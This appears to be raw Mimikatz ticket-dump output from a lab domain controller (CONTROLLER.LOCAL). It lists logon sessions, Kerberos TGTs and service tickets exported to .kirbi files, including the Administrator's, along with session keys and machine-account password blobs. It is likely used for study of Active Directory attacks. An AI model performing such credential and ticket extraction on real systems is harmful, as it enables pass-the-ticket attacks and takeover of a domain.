        Group 2 - Ticket Granting Ticket 
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b084d5f1284d8c7f64542268af31a9588290047ed7edb4293fa46c92b45093a0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;2ec2b]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 60346 (00000000:0000ebba)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:29 PM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39
 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b
 fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da
 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa
 e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0
 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a
 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b  

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:27 PM
SID               : S-1-5-20

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000] 
           Start/End/MaxRenew: 5/31/2023 4:49:32 PM ; 6/1/2023 2:49:32 AM ; 6/7/2023 4:49:32 PM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL    
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL    
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             64495d2731962b2d3691e1ce844799f92e123fa5508651aca873686b00d134ee
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !       

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:49:32 PM ; 6/1/2023 2:49:32 AM ; 6/7/2023 4:49:32 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             d0b45d99d57a8494405dd4be8014279a4a3452654c0b6f7187bd3994d25cc64c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 3240997 (00000000:00317425)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1 
Logon Time        : 5/31/2023 4:59:57 PM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 5/31/2023 5:12:44 PM ; 6/1/2023 2:59:57 AM ; 6/7/2023 4:59:57 PM
           Service Name (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000017 - rc4_hmac_nt
             54d24c292091d5ee37e74bd039b3b736
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;317425]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~3022
2.kirbi !
         [00000001]
           Start/End/MaxRenew: 5/31/2023 5:12:44 PM ; 6/1/2023 2:59:57 AM ; 6/7/2023 4:59:57 PM
           Service Name (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL 
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             89296e72ab944f0a70f3eef27a33fc9d
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;317425]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111
.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket 
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:59:57 PM ; 6/1/2023 2:59:57 AM ; 6/7/2023 4:59:57 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             e10edbc779896427b1b3859fef1023b6465f5b23feb5517e23e68f98ec50d04f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;317425]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 3028749 (00000000:002e370d)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:51:04 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service 

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b084d5f1284d8c7f64542268af31a9588290047ed7edb4293fa46c92b45093a0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
           * Saved to file [0;2e370d]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 1916772 (00000000:001d3f64)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/31/2023 4:43:22 PM
SID               : S-1-5-90-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce  

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1913784 (00000000:001d33b8)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/31/2023 4:43:21 PM
SID               : S-1-5-96-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1913720 (00000000:001d3378)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/31/2023 4:43:21 PM
SID               : S-1-5-96-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1842535 (00000000:001c1d67)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 5/31/2023 4:37:23 PM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL 
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:37:23 PM ; 6/1/2023 2:37:23 AM ; 6/7/2023 4:37:23 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             856f5f0d3526fb48464c7b6d4aba1c70f7859894e86fe2bff95b87734dc763ce 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1c1d67]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 398277 (00000000:000613c5)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:24:48 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$ 
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:13 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL    
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f318b2c50a6fafa7a6ec76f38f3e3455071c525af0fd05ef06e7e9c45cbed2c9 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;613c5]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !     

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 398217 (00000000:00061389)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:24:48 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$ 
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f294d5ba6c459ce240985872c35a0b2c1b64fc6797d10a4c6ac2cffaa2de8524 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;61389]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !     

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 398125 (00000000:0006132d)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:24:48 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$ 
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f294d5ba6c459ce240985872c35a0b2c1b64fc6797d10a4c6ac2cffaa2de8524 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;6132d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !     

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 191032 (00000000:0002ea38)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:20:06 PM
SID               : S-1-5-18

         * Username : CONTROLLER-1$ 
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f294d5ba6c459ce240985872c35a0b2c1b64fc6797d10a4c6ac2cffaa2de8524 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;2ea38]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !     

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:30 PM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null) 
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60327 (00000000:0000eba7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:29 PM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce  

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32910 (00000000:0000808e)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:26 PM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39
 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b
 fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da
 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa
 e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0
 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a
 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b  

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32886 (00000000:00008076)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:26 PM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce  

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32761 (00000000:00007ff9)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:26 PM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39
 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b
 fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da
 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa
 e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0
 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a
 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32741 (00000000:00007fe5)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:26 PM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : cb 3b ce ad 38 27 98 d7 50 9d da 7c e3 07 d6 cb 22 fb 3f aa ec 71 3e 7b 65 f4 c5 9d e8 6d
 10 ab 73 dc 7a 53 5b 1a dd 33 70 7a d8 a8 b4 29 e4 ff 62 8b 62 8b c7 d0 de 4d ea 3b 5b 34 4e 4a b6 27 d8 52 4d
 af f6 15 5e b1 fa 9f c4 6b 65 ec 33 24 71 18 56 2f 6c 94 9b 01 c5 0d d5 05 5b 09 4b 07 84 a7 c8 6e 88 03 db ae
 f6 ba 5d f8 38 1e 07 6e d0 fa 7b 10 24 0b 6a 61 1d c2 c4 0f 87 61 fe 88 84 b5 1f a0 ad 76 8c 5b 88 50 83 f2 cd
 91 77 91 89 23 39 29 02 ef 58 be 01 bf f3 95 cb 33 45 e3 0f 46 0d 5e a7 8e f2 9b ce 6d eb 58 9e 77 13 00 b0 d1
 32 4d 58 cf c9 e3 49 82 a0 ff d1 18 e9 6e 6f 27 97 e1 46 86 74 cd bb 4f b0 3e 5c ba 8b 87 10 44 33 c8 60 c2 f8
 83 02 cd d4 0d 43 f2 be dc e8 4e 85 2a ad 39 b4 8a 2e 1b 31 15 5b 10 ce ce

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 5/31/2023 4:19:14 PM
SID               : S-1-5-18

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null) 

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:51:04 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             0b4edfdd5c40f7f338c3cfb6b9def2272e88ae653d508f28b5ec51fc32c8db3f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...] 
           * Saved to file [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi !       
         [00000001]
           Start/End/MaxRenew: 5/31/2023 4:34:37 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL      
           Target Name  (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL      
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
